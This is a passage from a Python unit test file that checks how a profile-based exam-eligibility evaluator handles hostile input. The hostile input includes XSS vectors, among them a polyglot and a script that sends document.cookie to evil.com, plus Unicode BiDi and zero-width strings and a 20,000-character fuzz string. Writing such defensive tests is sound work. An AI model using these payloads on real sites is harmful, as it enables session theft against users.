        self.assertLess(depth_weights["Foundation"], depth_weights["Intermediate"])
        self.assertLess(depth_weights["Intermediate"], depth_weights["Advanced"])
        self.assertLess(depth_weights["Advanced"], depth_weights["Analytical"])


# ==============================================================================
# 6. XSS AND INPUT SANITIZATION ON PROFILE ATTRIBUTES
# ==============================================================================

class TestXSSAndInputSanitizationProfileAttributes(unittest.TestCase):
    """Sanitization and containment of XSS payloads, Unicode anomalies, and massive payload fuzzing."""

    def test_adv_29_xss_polyglot_injection_in_profile_fields(self):
        """Cross-Site Scripting vectors in profile fields are safely serialized without script execution."""
        xss_vectors = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*///alert(1)//'>",
            "\"><script>document.location='http://evil.com/'+document.cookie</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]

        for payload in xss_vectors:
            profile = UserProfile(
                dob="2000-01-01", gender="Male", category="GEN",
                degree=payload, discipline=payload, aggregate_pct=70.0,
                domicile_state="Delhi"
            )
            verdict = evaluate_statutory_eligibility(profile, "UPSC_CSE")
            # Verify verdict JSON is safely serializable
            json_str = json.dumps(verdict)
            self.assertNotIn("<script>alert", json_str.replace('\\"', '"'))

    def test_adv_30_html_tag_stripping_and_escaping_in_verdict_reports(self):
        """HTML markup injected into profile names or degrees does not pollute structured verdicts."""
        profile = UserProfile(
            dob="2000-01-01", gender="Male", category="GEN",
            degree="<b>Bachelor of Arts</b>", discipline="Civil", aggregate_pct=70.0
        )
        verdict = evaluate_statutory_eligibility(profile, "UPSC_CSE")
        self.assertIn("status", verdict)
        self.assertEqual(verdict["status"], "ELIGIBLE")

    def test_adv_31_unicode_homoglyphs_and_bidi_override_sanitization(self):
        """Unicode BiDi overrides, zero-width characters, and non-ASCII state names handle cleanly."""
        bidi_payload = "Delhi\u202E\u0041\u0042\u0043"  # Delhi with RTL override
        zero_width_payload = "Maharashtra\u200B\u200C\u200D"

        p1 = UserProfile(
            dob="1999-01-01", gender="Male", category="GEN", degree="Bachelor",
            discipline="ANY", aggregate_pct=70.0, domicile_state=bidi_payload
        )
        v1 = evaluate_statutory_eligibility(p1, "UPSC_CSE")
        self.assertIn("status", v1)

        p2 = UserProfile(
            dob="1999-01-01", gender="Male", category="GEN", degree="Bachelor",
            discipline="ANY", aggregate_pct=70.0, domicile_state=zero_width_payload
        )
        v2 = evaluate_statutory_eligibility(p2, "UPSC_CSE")
        self.assertIn("status", v2)

    def test_adv_32_massive_payload_fuzzing_buffer_safety(self):
        """Massive input strings (20,000 characters) do not trigger ReDoS or stack overflow."""
        massive_string = "A" * 20000
        p_massive = UserProfile(
            dob="2000-01-01", gender="Male", category="GEN",
            degree=massive_string, discipline=massive_string, aggregate_pct=75.0,
            domicile_state="Delhi"
        )
        # Should evaluate deterministically within a few milliseconds
        start_t = datetime.datetime.now()
        v = evaluate_statutory_eligibility(p_massive, "UPSC_CSE")
        elapsed = (datetime.datetime.now() - start_t).total_seconds()

        self.assertLess(elapsed, 1.0, "Massive input must not cause ReDoS or CPU lockup")
        self.assertIn("status", v)


if __name__ == "__main__":
    unittest.main(verbosity=2)
